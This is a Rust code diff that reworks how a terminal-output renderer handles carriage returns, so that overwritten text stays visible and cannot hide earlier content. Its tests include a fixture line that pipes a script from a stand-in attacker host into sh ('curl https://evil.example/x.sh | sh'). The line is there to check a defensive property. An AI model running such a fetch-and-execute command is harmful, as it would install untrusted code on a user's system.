@@ -1,11 +1,14 @@
 //! A terminal's output as a body draws it (DESIGN §4.2.4 "Bash"): its colours kept as marks
-//! ([`Ansi`]), every other escape and control dropped, and a carriage return taking the line
-//! back to its start as a terminal's would (a progress bar drawn over itself is its last state).
+//! ([`Ansi`]), every other escape and control dropped, and a carriage return taking the cursor
+//! back to the line's start as a terminal's does: what follows writes over the line, and what
+//! it doesn't reach stays (a progress bar drawn over itself is its last state, and `abcdef`,
+//! a return and `XY` read `XYcdef`, never just `XY`).
 //!
 //! The output is a transcript's, so it is hostile. One pass over it, which looks ahead at most
 //! [`ESCAPE_BYTES`] for an escape's end: an escape that hasn't ended by then is dropped up to
 //! its introducer and what follows is read as text, so an unterminated or giant escape costs
-//! no more than its bytes and hides nothing after it. The marks are at most [`MARKS`].
+//! no more than its bytes and hides nothing after it. A character written over another costs
+//! what writing it does. The marks are at most [`MARKS`].
 
 use std::ops::Range;
 
@@ -18,60 +21,87 @@ pub const MARKS: usize = 64 * 1024;
 
 /// `raw`, a terminal's output, as drawn: the text, and its colours.
 pub fn strip(raw: &str) -> (String, Vec<(Range<usize>, Mark)>) {
+    shape(raw, true)
+}
+
+/// The text of `raw` as drawn, without its colours: what Find searches.
+pub fn strip_text(raw: &str) -> String {
+    shape(raw, false).0
+}
+
+/// The line being written: each character and its colour, and the column the cursor is at.
+struct Line {
+    cells: Vec<(char, Option<Ansi>)>,
+    column: usize,
+}
+
+impl Line {
+    fn put(&mut self, c: char, colour: Option<Ansi>) {
+        match self.cells.get_mut(self.column) {
+            Some(cell) => *cell = (c, colour),
+            None => self.cells.push((c, colour)),
+        }
+        self.column += 1;
+    }
+
+    /// Writes the line out to `out`, and its colours to `marks` when `keep` says.
+    fn flush(&mut self, out: &mut String, marks: &mut Vec<(Range<usize>, Mark)>, keep: bool) {
+        let mut run: Option<(Ansi, usize)> = None;
+        for &(c, colour) in &self.cells {
+            if run.map(|(ansi, _)| ansi) != colour {
+                if let Some((ansi, start)) = run.take()
+                    && keep
+                    && marks.len() < MARKS
+                {
+                    marks.push((start..out.len(), Mark::Ansi(ansi)));
+                }
+                run = colour.map(|ansi| (ansi, out.len()));
+            }
+            out.push(c);
+        }
+        if let Some((ansi, start)) = run
+            && keep
+            && marks.len() < MARKS
+        {
+            marks.push((start..out.len(), Mark::Ansi(ansi)));
+        }
+        self.cells.clear();
+        self.column = 0;
+    }
+}
+
+/// `raw` as drawn, its colours kept when `keep` says (the module docs).
+fn shape(raw: &str, keep: bool) -> (String, Vec<(Range<usize>, Mark)>) {
     let bytes = raw.as_bytes();
     let mut out = String::with_capacity(raw.len());
     let mut marks: Vec<(Range<usize>, Mark)> = Vec::new();
-    /* The colour asked for, and where in `out` it was asked for. */
-    let mut colour: Option<(Ansi, usize)> = None;
-    let mut line_start = 0;
-    let mut at = 0;
-    let close = |colour: &mut Option<(Ansi, usize)>, end: usize, marks: &mut Vec<_>| {
-        if let Some((ansi, start)) = colour.take()
-            && start < end
-            && marks.len() < MARKS
-        {
-            marks.push((start..end, Mark::Ansi(ansi)));
-        }
+    let mut colour: Option<Ansi> = None;
+    let mut line = Line {
+        cells: Vec::new(),
+        column: 0,
     };
+    let mut at = 0;
     while at < bytes.len() {
         match bytes[at] {
             0x1b => {
                 let (end, sgr) = escape(bytes, at);
                 if let Some(params) = sgr {
-                    let next = sgr_colour(params, colour.map(|(ansi, _)| ansi));
-                    if next != colour.map(|(ansi, _)| ansi) {
-                        close(&mut colour, out.len(), &mut marks);
-                        colour = next.map(|ansi| (ansi, out.len()));
-                    }
+                    colour = sgr_colour(params, colour);
                 }
                 at = end;
             }
             b'\n' => {
-                let carried = colour;
-                close(&mut colour, out.len(), &mut marks);
+                line.flush(&mut out, &mut marks, keep);
                 out.push('\n');
-                line_start = out.len();
-                colour = carried.map(|(ansi, _)| (ansi, out.len()));
                 at += 1;
             }
             b'\r' if bytes.get(at + 1) == Some(&b'\n') => at += 1,
             b'\r' => {
-                /* Back to the line's start: what was drawn on it goes, its colour stays. */
-                out.truncate(line_start);
-                while marks
-                    .last()
-                    .is_some_and(|(mark, _)| mark.start >= line_start)
-                {
-                    marks.pop();
-                }
-                if let Some((range, _)) = marks.last_mut() {
-                    range.end = range.end.min(line_start);
-                }
-                colour = colour.map(|(ansi, _)| (ansi, line_start));
+                line.column = 0;
                 at += 1;
             }
             b'\t' => {
-                out.push('\t');
+                line.put('\t', colour);
                 at += 1;
             }
             byte if byte < 0x20 || byte == 0x7f => at += 1,
@@ -79,13 +109,13 @@ pub fn strip(raw: &str) -> (String, Vec<(Range<usize>, Mark)>) {
                 let c = raw[at..].chars().next().unwrap_or('\u{fffd}');
                 /* The eight-bit controls, C1, drawn as nothing. */
                 if !('\u{80}'..='\u{9f}').contains(&c) {
-                    out.push(c);
+                    line.put(c, colour);
                 }
                 at += c.len_utf8();
             }
         }
     }
-    close(&mut colour, out.len(), &mut marks);
+    line.flush(&mut out, &mut marks, keep);
     (out, marks)
 }
 
@@ -252,6 +282,19 @@ mod tests {
                 vec![("100%".to_string(), Ansi::Green)]
             )
         );
+        /* A return writes over the line and leaves what it doesn't reach: nothing hides. */
+        for (raw, shown) in [
+            ("secret\r", "secret"),
+            ("abcdef\rXY\n", "XYcdef\n"),
+            ("Tests failed: 3\rTests passed\n", "Tests passed: 3\n"),
+            (
+                "curl https://evil.example/x.sh | sh\r          \nok",
+                "          ://evil.example/x.sh | sh\nok",
+            ),
+        ] {
+            assert_eq!(strip(raw).0, shown, "{raw:?}");
+            assert_eq!(strip_text(raw), shown, "{raw:?}");
+        }
     }
 
     #[test]
@@ -279,9 +322,9 @@ mod tests {
         let flicker = "\u{1b}[31ma\u{1b}[32mb".repeat(200_000);
         let (text, marks) = strip(&flicker);
         assert_eq!((text.len(), marks.len()), (400_000, MARKS));
-        /* Carriage returns on one long line: each character goes once. */
+        /* Carriage returns on one long line: each character is written once. */
         let returns = "abc\r".repeat(1_000_000);
-        assert_eq!(strip(&returns).0, "");
+        assert_eq!(strip(&returns).0, "abc");
         assert!(
             started.elapsed().as_secs_f64() < 5.0,
             "{:?}",
